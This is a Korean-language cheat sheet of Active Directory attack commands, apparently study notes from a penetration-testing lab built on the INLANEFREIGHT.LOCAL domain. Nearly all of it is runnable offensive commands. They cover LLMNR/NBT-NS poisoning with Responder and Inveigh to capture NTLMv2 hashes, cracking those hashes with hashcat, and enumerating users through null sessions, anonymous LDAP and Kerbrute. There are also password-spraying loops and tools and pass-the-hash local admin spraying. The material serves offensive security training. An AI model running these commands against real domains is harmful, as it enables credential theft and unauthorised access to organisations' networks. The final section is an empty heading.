# Active Directory Enumeration

## 공개 도메인 정보
```nslookup -type=txt domain.com```

<br/><br/>
## 호스트 식별
```sudo tcpdump -i ens224```
```sudo responder -I ens224 -A ```

### FPing Active Check
```fping -asgq 172.16.5.0/23```

### Nmap 스캐닝(-A 공격적 스캔)
```sudo nmap -v -A -iL hosts.txt -oN /home/host-enum```

<br/><br/>
## 사용자 식별

### Kerbrute - 내부 AD 사용자 이름 Enumeration
```
sudo git clone https://github.com/ropnop/kerbrute.git
make help
sudo make all
ls dist/
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o valid_ad_users
```
<br/><br/>
## LLMNR & NBT-NS Sniffing

### Responder - Linux
```sudo responder -I ens224```<br/>
```hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt```

### Inveigh - Windows
```Import-Module .\Inveigh.ps1```<br/>
```Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y```

#### C# Inveigh (InveighZero)
```
.\Inveigh.exe
> ESC키
> GET NTLMV2USERNAMES   # 수집된 사용자명
> GET NTLMV2UNIQUE      # 수집된 Hash
```

<br/><br/>
## Password Spraying

### 비밀번호 정책 열거 - 자격증명 (Linux)
```crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol```

### 비밀번호 정책 열거 - SMB NULL Sessions (Linux)
```rpcclient -U "" -N 172.16.5.5```<br/>
```rpcclient $> querydominfo```

### 비밀번호 정책 열거 - enum4linux (Linux)
```enum4linux -P 172.16.5.5```
```enum4linux-ng -P 172.16.5.5 -oA <outfile>```<br/>
```cat outfile.json```

### 비밀번호 정책 열거 - LDAP Anonymous Bind (Linux)
```ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength```

### 비밀번호 정책 열거 - SMB NULL Sessions (Windows)
```net use \\DC01\ipc$ "" /u:""```              # null session 연결 확인
```net use \\DC01\ipc$ "" /u:guest```           # Account 비활성화 확인
```net use \\DC01\ipc$ "password" /u:guest```   # Password 비일치 또는 계정 잠김 확인

### 비밀번호 정책 열거 (Windows)
```net accounts```
```
import-module .\PowerView.ps1
Get-DomainPolicy
```

### SMB NULL Sessions으로 사용자 목록 가져오기
```enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"```
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```
```crackmapexec smb 172.16.5.5 --users```

### LDAP Anonymous를 사용하여 사용자 수집
```ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "```<br/>
```./windapsearch.py --dc-ip 172.16.5.5 -u "" -U```

### Kerbrute를 사용하여 사용자 열거
```kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt```

### 유효한 자격 증명을 사용하여 사용자 열거
```sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users```

<br/><br/>
## Internal Password Spraying - Linux

### Bash를 이용한 one-liner Attack
```for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done```

### Kerbrute 사용
```kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1```

### CrackMapExec 사용
```sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +```

### CrackMapExec를 사용하여 자격증명 검증
```sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123```

### CrackMapExec를 사용한 Local Admin Spraying
```sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +```

<br/><br/>
## Internal Password Spraying - Windows

### DomainPasswordSpray.ps1 사용
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

<br/><br/>
## Enumerating Security Controls







